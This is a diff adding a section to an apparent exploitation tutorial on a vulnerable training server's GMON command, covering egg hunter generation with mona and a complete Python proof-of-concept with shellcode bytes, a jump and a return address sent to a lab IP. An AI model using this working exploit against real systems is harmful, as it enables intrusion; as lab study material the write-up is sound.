@@ -184,3 +184,37 @@ We restart the application in Immunity, we throw our script at it. Application c
 
 We step though the jump withh `F7` and we land back in our A's:
 <img src="{{ site.url }}{{ site.baseurl }}/images/validate.png" alt="">
+
+Now it is time to generate our egg hunter. We will do this with mona. This is the command I issued:
+`!mona egg -t w00t`:
+<img src="{{ site.url }}{{ site.baseurl }}/images/eggsy.png" alt="">
+
+We now are going to update our PoC with the egg hunter, and I will explain the changes after I show them. Here is the new PoC:
+```console
+root@kali:~/Desktop# cat EGGSY.py 
+#!/usr/bin/python
+import socket
+import sys
+import os
+
+#Vulnerable command
+command = "GMON /.:/"
+
+#Egg hunta 32 bytes
+egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
+"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
+
+pwn = "A" * 3457
+pwn+= egghunter
+pwn+= "AAAAAA"
+pwn+= "\xeb\xd8\x90\x90"
+pwn+= "\xb3\x11\x50\x62"
+pwn+= "D" * (5000-3495-4-4)
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("172.16.55.134", 9999))
+
+s.send(command+pwn)
+s.recv(1024)
+s.close()
+```
